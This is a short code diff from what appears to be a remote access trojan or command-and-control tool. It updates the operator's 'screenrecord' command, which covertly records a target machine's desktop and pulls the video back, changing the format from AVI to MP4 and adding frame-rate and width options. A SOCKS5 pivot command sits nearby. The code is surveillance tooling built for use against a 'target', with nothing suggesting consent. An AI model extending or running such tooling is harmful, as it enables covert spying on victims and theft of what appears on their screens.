@@ -563,14 +563,14 @@ def cmd_socks5(session: Session, args: list[str]) -> CommandResult:
 # Screen recording
 # ---------------------------------------------------------------------------
 
-@_cmd("screenrecord", usage="screenrecord <seconds>",
-      help_text="Record the target's desktop as an AVI video file and pull it back")
+@_cmd("screenrecord", usage="screenrecord <seconds> [fps] [scale_width]",
+      help_text="Record the target's desktop as MP4 (default 12 fps, 1280px wide) and pull it back")
 def cmd_screenrecord(session: Session, args: list[str]) -> CommandResult:
     if not args or not args[0].isdigit():
-        return _err("Usage: screenrecord <seconds>")
+        return _err("Usage: screenrecord <seconds> [fps] [scale_width]")
     seconds = int(args[0])
-    local   = session.download_path("screenrec.avi")
-    send_msg(session.conn, f"screenrecord {seconds}")
+    local   = session.download_path("screenrec.mp4")
+    send_msg(session.conn, f"screenrecord {' '.join(args)}")
     err = _recv_file_or_err(session.conn, local, timeout=seconds + 30)
     if err:
         return err
